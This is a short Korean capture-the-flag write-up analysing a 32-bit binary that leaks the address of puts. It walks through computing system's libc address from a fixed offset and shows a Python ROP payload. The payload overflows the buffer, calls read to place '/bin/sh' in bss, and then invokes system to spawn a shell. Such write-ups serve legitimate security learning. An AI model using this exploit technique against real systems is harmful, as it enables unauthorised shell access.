## 함수 분석 / 취약점 발견
### main
IDA로 decompiling을 했는데 main에서 대놓고 puts함수의 주소를 주고 있었다.
```c
  printf("oh, here is %s. Also I %x the variable foods for you.\n", s, &puts);
```
libc상에서 puts와 system의 offset차이는 항상 동일함을 실험(?)을 통해 밝혀냈다. (`p system - puts`). (추가: libc에서는 어떤 함수든 offset의 차이가 항상 동일하다.)
* system의 주소를 구할 수 있음이 확정되었다!
* 마찬가지로 read 함수도 실행시킬 수 있다. 즉, /bin/sh을 입력하자

### 결론
* read 함수를 실행시켜 /bin/sh에 입력하자
* system의 함수 주소를 가지고 "/bin/sh을 실행시키자"

## 구현
* 이번에는 /bin/sh을 stack이 아닌 bss에 입력하였다. bss영역의 주소는 readelf로 구하였다.
```python
payload = b'a'*274
payload += p32(read_addr) + p32(pppr) + p32(0) + p32(bss) + p32(8) + p32(system_addr) + b"aaaa" + p32(bss)
p.sendline(payload)
p.recvline()
p.send('/bin/sh\x00')
```